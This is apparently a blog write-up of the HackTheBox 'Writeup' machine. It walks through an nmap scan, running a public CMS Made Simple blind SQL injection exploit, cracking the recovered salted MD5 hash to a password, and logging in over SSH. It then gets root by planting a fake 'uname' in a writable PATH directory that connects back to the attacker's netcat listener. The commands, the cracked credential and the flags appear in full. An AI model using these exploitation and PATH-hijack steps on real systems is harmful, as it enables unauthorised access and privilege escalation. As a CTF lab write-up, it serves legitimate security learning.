---
title: "Writeup - HackTheBox"
date: 2019-10-12T17:39:53+02:00
tags:
    - "CTF"
    - "HackTheBox"
    - "SQL"
    - "exploiting"
draft: false
---

Writeup is an easy Linux machine on HackTheBox. It's about enumeration and
exploitation.

# User

As always, the first thing to do is a port scan with nmap:
```
$ nmap -A 10.10.10.138
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-12 14:29 EDT
Nmap scan report for 10.10.10.138
Host is up (0.060s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
```

Let's visit the web server:

![Pagina web](/images/hackthebox/writeup/web.png)

The website index does not contain anything interesting. Let's visit the
`writeup` directory that `nmap` found in the `robots.txt` file:

![Writeup directory](/images/hackthebox/writeup/web-writeup.png)

The links in the list are to the following urls:
```
http://10.10.10.138/writeup/index.php?page=ypuffy
http://10.10.10.138/writeup/index.php?page=blue
http://10.10.10.138/writeup/index.php?page=writeup
```
and they only contains text.

Trying some basic fuzzing on the `page` parameter gives us only 404 pages. Even
local file inclusion does not work.
Let's take a step back and navigate through the source code of the website.
In the `head` section there are references to `CMS made simple`
```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

A quick search with `searchsploit` gives us a long list of exploits:
```
$ searchsploit cms made simple
-------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                        |  Path
                                                                                      | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------- ----------------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | exploits/php/remote/46627.rb
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                               | exploits/php/webapps/26217.html
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                               | exploits/php/webapps/26298.txt
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                            | exploits/php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                | exploits/php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | exploits/php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | exploits/php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                           | exploits/php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | exploits/php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | exploits/php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                          | exploits/php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                         | exploits/php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | exploits/php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | exploits/php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                         | exploits/php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | exploits/php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                         | exploits/php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                       | exploits/php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                              | exploits/php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | exploits/php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | exploits/php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | exploits/php/webapps/46546.py
-------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Given that the date of the copyright string is 2019, it must the most recent
exploit, so let's download it with:
```
$ searchsploit -m 46635
```

Reading the code we can see that it exploits a SQL injection vulnerabilty in the
`moduleinterface.php` file. More specifically, it's a time based blind SQL
injection, you can find a good explanation
[here](http://www.sqlinjection.net/time-based/).

Eseguiamo allora l'exploit:
```
$ python2 46635.py -u http://10.10.10.138/writeup/

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

The exploit finds the username of the administration panel, the password hash
and the salt used to hash the password. The hash format is `MD5($SALT.$PASSWORD)`
, let's use `hashcat` to try to bruteforce it:
```
$ hashcat --force -m 20 hash.txt rockyou.txt
```

It only takes a couple of seconds with a gpu and the password is `raykayjay9`.
Let's try the password on `ssh`:

```
$ ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$
```

And here's the flag:
```
jkr@writeup:~$ cat user.txt
d4e493fd4068afc9eb1aa6a55319f978
```

# Root

The first thing that I usually do is a basic local enumeration with tools like
`LinEnum` and `pspy`. HackTheBox machines do not have internet access, so let's
copy then on the machine with `scp`:
```
$ scp LinEnum jrk@10.10.10.138:~
$ scp pspy64 jrk@10.10.10.138:~
```

`LinEnum` does not give us something interesting. At first, also `pspy` was not
interesting. After a couple of minutes I connected using another `ssh`
connection and something interesting popped out on `pspy`:


![pspy](/images/hackthebox/writeup/pspy.png)

This command gets executed on every `ssh` connection:
```bash
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:\
    /usr/sbin:/usr/bin:/sbin:/bin \
    run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```

The `run-parts` command runs every file present in the indicated directory,
`/etc/update-motd.d` in our case, and the output of it gets written in
`/run/motd.dynamic.new`.

If we could write a script in `/etc/update-motd.d` then it's done! Let's check
the permissions on the directory:
```
$ ls -la /etc/update-motd.d/
total 12
drwxr-xr-x  2 root root 4096 Apr 19 04:12 .
drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..
-rwxr-xr-x  1 root root   23 Jun  3  2018 10-uname
```

Sadly, only `root` is allowed to write. Let's inspect `10-uname`:
```bash
#!/bin/sh
uname -rnsom
```
It just runs the `uname` command. After a bit of thinking, I remembered that the
command that gets executed on every ssh connection had a custom `PATH` variable,
so I thought that if I can write an executable called `uname` in one of the
directories, It could be executed instead of the original one. Luckily, the
first one in the `PATH` variable is writeable by us:
```
jkr@writeup:~$ ls -lad /usr/local/sbin
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin
```

Let's then write the file (`/usr/local/sbin/uname`) that will gets us a `root`
connection using `netcat`
```
#!/bin/sh
nc 10.10.14.25 1337
```

After saving it, give it execute permissions with `chmod +x` and run `nc -lnvp
1337` on your machine to listen for the connection. After a successful `ssh`
connection the custom `uname` script gets executed an we can read the flag:
```
$ cat /root/root.txt
eeba47f60b48ef92b734f9b6198d7226
```

Thanks for the reading, see you in the next one!
